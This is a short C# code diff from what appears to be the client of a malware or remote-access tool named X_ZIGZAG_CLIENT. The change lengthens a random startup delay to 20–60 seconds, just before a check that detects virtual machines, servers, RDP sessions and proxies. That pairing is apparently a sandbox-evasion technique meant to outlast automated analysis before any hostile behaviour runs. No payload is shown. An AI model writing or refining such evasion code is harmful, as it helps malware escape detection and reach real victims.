@@ -57,7 +57,7 @@ namespace X_ZIGZAG_CLIENT
         static async Task Main()
         {
             // Sleep for a random time
-            Thread.Sleep(new Random().Next(0, 20000));
+            Thread.Sleep(new Random().Next(20_000, 60_000));
             // Basic Check if VM/VPS/RDP/SERVER + Proxy 
             if (await EnvironmentChecker.IsRunningInVM())
             {
